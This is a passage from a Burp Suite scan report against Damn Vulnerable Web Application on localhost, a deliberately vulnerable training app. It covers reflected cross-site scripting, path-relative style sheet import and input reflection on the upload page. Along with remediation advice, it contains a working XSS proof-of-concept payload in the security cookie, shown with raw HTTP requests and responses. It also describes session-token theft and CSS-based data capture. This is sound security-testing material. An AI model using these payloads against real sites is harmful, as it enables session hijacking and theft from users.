<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:12 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4113<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application <br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/sqli_blind/index.php/czsupa/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=f5oq2fst9t6hc9jfvdmfbbcipl<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:12 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4113<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: SQL Injection (Blind) :: Damn Vulnerable Web Application <br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="27">27.&nbsp;http://localhost:7878/dvwa/vulnerabilities/upload/</span>
<br><a class="PREVNEXT" href="#26">Previous</a>
&nbsp;<a class="PREVNEXT" href="#28">Next</a>
<br>
<span class="BODH1" id="27.1">27.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#26.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#27.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/upload/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>fqvyp'&gt;&lt;script&gt;alert(1)&lt;/script&gt;ee15u</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/upload/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">fqvyp'%3e%3cscript%3ealert(1)%3c%2fscript%3eee15u</span>; PHPSESSID=rcg34dvvoc8icqk0mh0fn1f57j<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:57 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=rcg34dvvoc8icqk0mh0fn1f57j; path=/<br>Set-Cookie: security=low<br>Content-Length: 4173<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=upload&amp;security=low<span class="HIGHLIGHT">fqvyp'&gt;&lt;script&gt;alert(1)&lt;/script&gt;ee15u</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="27.2">27.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#27.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#27.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/upload/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/upload/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=rcg34dvvoc8icqk0mh0fn1f57j<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:54 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4007<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/upload/<span class="HIGHLIGHT">index.php/goic2i/u0oaqn/yqptn1/</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=rcg34dvvoc8icqk0mh0fn1f57j<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:02 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4007<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/upload/index.php/goic2i/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=rcg34dvvoc8icqk0mh0fn1f57j<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:02 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4007<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="27.3">27.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#27.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#27.4">Next</a>
<br>
<br><span class="TEXT">There are 2 instances of this issue:
<ul>
<li><a href="#27.3.1">/dvwa/vulnerabilities/upload/ [filename multipart parameter attribute]</a></li>
<li><a href="#27.3.2">/dvwa/vulnerabilities/upload/ [security cookie]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="27.3.1">27.3.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/upload/ [filename multipart parameter attribute]</span>
<br><a class="PREVNEXT" href="#26.1.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#27.3.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/upload/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>filename</b> multipart parameter attribute is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/upload/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=1bvl2g3sa0au476ao86k95bitv<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/upload/<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryau7YZP3lt8mBw1On<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 401<br><br>------WebKitFormBoundaryau7YZP3lt8mBw1On<br>Content-Disposition: form-data; name="MAX_FILE_SIZE"<br><br>100000<br>------WebKitFormBoundaryau7YZP3lt8mBw1On<br>Content-Disposition: form-data; name="uploaded"; filename="file.txt<span class="HIGHLIGHT">gguz7rlaha</span>"<br>Content-Type: text/plain<br><br>4qLEHHMM7h<br>------WebKitFormBoundaryau7YZP3lt8mBw1On<br>Content-Disposition: form-data; name="Upload"<br><br>Upload<br>------WebKitFormBoundaryau7YZP3lt8mBw1On--<br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:37:32 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4081<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;pre&gt;../../hackable/uploads/file.txt<span class="HIGHLIGHT">gguz7rlaha</span> succesfully uploaded!&lt;/pre&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="27.3.2">27.3.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/upload/ [security cookie]</span>
<br><a class="PREVNEXT" href="#27.3.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#28.3.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/upload/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/upload/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">bvdht7jtib</span>; PHPSESSID=rcg34dvvoc8icqk0mh0fn1f57j<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:32:56 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=rcg34dvvoc8icqk0mh0fn1f57j; path=/<br>Set-Cookie: security=low<br>Content-Length: 4119<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: File Upload :: Damn Vulnerable Web Application (DVWA) v1.<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=upload&amp;security=low<span class="HIGHLIGHT">bvdht7jtib</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=upload&amp;security=low<span class="HIGHLIGHT">bvdht7jtib</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="27.4">27.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00500980_fileuploadfunctionality">File upload functionality</a></span>
<br><a class="PREVNEXT" href="#27.3">Previous</a>
